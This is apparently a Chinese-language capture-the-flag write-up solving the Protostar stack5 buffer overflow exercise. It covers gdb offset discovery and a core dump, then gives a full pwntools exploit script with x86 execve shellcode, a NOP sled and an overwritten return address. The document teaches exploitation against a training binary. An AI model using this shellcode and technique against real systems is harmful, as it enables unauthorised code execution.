
```
Stack5 is a standard buffer overflow, this time introducing shellcode.

This level is at /opt/protostar/bin/stack5

**Hints**

- At this point in time, it might be easier to use someone elses shellcode
- If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
- remove the int3s once your shellcode is done.
```
### **Source code:**
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

**checksec:**

```bash
└─$ checksec --file=stack5
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   67 Symbols        No    0               1               stack5
                       
```

**objdump:**

```sh
└─$ objdump -t -j .text ./stack5

./stack5:     file format elf32-i386

SYMBOL TABLE:
08048310 l    d  .text  00000000              .text
08048340 l     F .text  00000000              __do_global_dtors_aux
080483a0 l     F .text  00000000              frame_dummy
08048450 l     F .text  00000000              __do_global_ctors_aux
080483e0 g     F .text  00000005              __libc_csu_fini
08048310 g     F .text  00000000              _start
080483f0 g     F .text  0000005a              __libc_csu_init
0804844a g     F .text  00000000              .hidden __i686.get_pc_thunk.bx
080483c4 g     F .text  00000017              main

```
### **查看汇编代码:**

```sh
gdb-peda$ file stack5
Reading symbols from stack5...
gdb-peda$ disass main
Dump of assembler code for function main:
   0x080483c4 <+0>:     push   ebp
   0x080483c5 <+1>:     mov    ebp,esp
   0x080483c7 <+3>:     and    esp,0xfffffff0
   0x080483ca <+6>:     sub    esp,0x50
   0x080483cd <+9>:     lea    eax,[esp+0x10]
   0x080483d1 <+13>:    mov    DWORD PTR [esp],eax
   0x080483d4 <+16>:    call   0x80482e8 <gets@plt>
   0x080483d9 <+21>:    leave
   0x080483da <+22>:    ret
End of assembler dump.
```
### **调试过程如下：**
```sh
└─$ gdb-peda
Successfully imported six module
gdb-peda$ file stack5
Reading symbols from stack5...
gdb-peda$ pattern_create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ run
Starting program: /opt/protostar/bin/stack5 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

Program received signal SIGSEGV, Segmentation fault.
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.

[----------------------------------registers-----------------------------------]
EAX: 0xffffce50 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EBX: 0xf7f95e14 --> 0x232d0c ('\x0c-#')
ECX: 0xf7f978ec --> 0x0 
EDX: 0x0 
ESI: 0x80483f0 (<__libc_csu_init>:      push   ebp)
EDI: 0xf7ffcb60 --> 0x0 
EBP: 0x65414149 ('IAAe')
ESP: 0xffffcea0 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EIP: 0x41344141 ('AA4A')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41344141
[------------------------------------stack-------------------------------------]
0000| 0xffffcea0 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0004| 0xffffcea4 ("fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0xffffcea8 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0012| 0xffffceac ("AgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| 0xffffceb0 ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0020| 0xffffceb4 ("AAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| 0xffffceb8 ("A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0028| 0xffffcebc ("MAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41344141 in ?? ()
gdb-peda$ pattern_offset 0x41344141
1093943617 found at offset: 76
```

### 得到溢出的长度为76
### 下面分析shellcode的地址，也就是缓冲区的起始地址
```sh
└─$ python -c "print('a'*76 + 'bbbb')" | ./stack5                  
zsh: done                              python -c "print('a'*76 + 'bbbb')" | 
zsh: segmentation fault (core dumped)  ./stack5
                                                                                                                                                                
┌──(kali㉿kali)-[/opt/protostar/bin]
└─$ gdb -q ./stack5 core.106045 
Successfully imported six module
Reading symbols from ./stack5...
[New LWP 106045]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Core was generated by `./stack5'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x62626262 in ?? ()
(gdb) x/100x $esp-80
0xffffce90:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffcea0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffceb0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffcec0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffced0:     0x61616161      0x61616161      0x61616161      0x62626262
0xffffcee0:     0x00000000      0xffffcf94      0xffffcf9c      0xffffcf00
0xffffcef0:     0xf7f95e14      0x080483c4      0x00000001      0xffffcf94
0xffffcf00:     0xf7f95e14      0x080483f0      0xf7ffcb60      0x00000000
0xffffcf10:     0x6e83a210      0x21e76400      0x00000000      0x00000000
0xffffcf20:     0x00000000      0xf7ffcb60      0x00000000      0x4b3b3500
0xffffcf30:     0xf7ffda60      0xf7d87c56      0xf7f95e14      0xf7d87d88
0xffffcf40:     0xf7fc7ac4      0xf7ffcfec      0x00000001      0x08048310
0xffffcf50:     0x00000000      0xf7fd8390      0xf7d87d09      0xf7ffcfec
0xffffcf60:     0x00000001      0x08048310      0x00000000      0x08048331
0xffffcf70:     0x080483c4      0x00000001      0xffffcf94      0x080483f0
0xffffcf80:     0x080483e0      0xf7fcbd20      0xffffcf8c      0xf7ffda60
0xffffcf90:     0x00000001      0xffffd17c      0x00000000      0xffffd185
0xffffcfa0:     0xffffd194      0xffffd1a8      0xffffd1cb      0xffffd201
0xffffcfb0:     0xffffd222      0xffffd22f      0xffffd24d      0xffffd269
0xffffcfc0:     0xffffd279      0xffffd28a      0xffffd294      0xffffd2a1
0xffffcfd0:     0xffffd2b2      0xffffd2d1      0xffffd37d      0xffffd39b
0xffffcfe0:     0xffffd3b6      0xffffd3cd      0xffffd3e0      0xffffd3fe
0xffffcff0:     0xffffd419      0xffffd467      0xffffd47a      0xffffd482
0xffffd000:     0xffffd495      0xffffd4c4      0xffffd4d8      0xffffd4e2
0xffffd010:     0xffffd4ed      0xffffd50f      0xffffd530      0xffffd549
```
### 可以看到，0xffffce90就是缓冲区的栈顶
### 下面编写利用脚本：
```python
from pwn import *


#x86 Linux execve("/bin/sh") shellcode
'''
xor eax, eax        ; \x31\xc0 - 将EAX清零
push eax            ; \x50 - 压入空终止符(0)
push 0x68732f2f     ; \x68\x2f\x2f\x73\x68 - 压入"//sh" (小端序)
push 0x6e69622f     ; \x68\x2f\x62\x69\x6e - 压入"/bin" (小端序)
mov ebx, esp        ; \x89\xe3 - EBX指向字符串"/bin//sh"
push eax            ; \x50 - 压入NULL作为argv结束符
mov edx, esp        ; \x89\xe2 - EDX指向环境变量数组(设为NULL)
push ebx            ; \x53 - 压入EBX(即"/bin//sh"地址)作为argv[0]
mov ecx, esp        ; \x89\xe1 - ECX指向argv数组
mov al, 0xb         ; \xb0\x0b - 设置系统调用号(execve=11)
int 0x80            ; \xcd\x80 - 触发系统调用
'''
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

nop_sled = b'\x90' * 32
padding_length = 76 - len(nop_sled) - len(shellcode)
padding = b'A' * padding_length
return_addr = p32(0xffffce90 + 16)  # 安全地指向NOP滑板中间

payload = nop_sled + shellcode + padding + return_addr

sh = process('./stack5')
sh.sendline(payload)
sh.interactive()
```
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250825203124059.png)


---
### 不直接使用shellcode = asm(shellcraft.sh()),是因为运行脚本会报EOF错误(头大了很久)，后面仔细排查发现原因如下：
### shellcode = asm(shellcraft.sh())的长度为44,比典型的x86 execve /bin/sh shellcode（通常23-28字节）要长得多

### payload结构：

**`[NOP 32字节][shellcode 44字节][填充 0字节][返回地址 4字节]`**
- **缓冲区总大小：76字节**
- **32 + 44 = 76字节（刚好填满缓冲区）**
- **没有留下任何空间给shellcode执行时使用的栈空间**
### 但是，shellcode执行时需要在栈上创建参数数组和环境变量，但缓冲区已被完全填满，没有额外空间，所以没有采用`shellcode = asm(shellcraft.sh())`
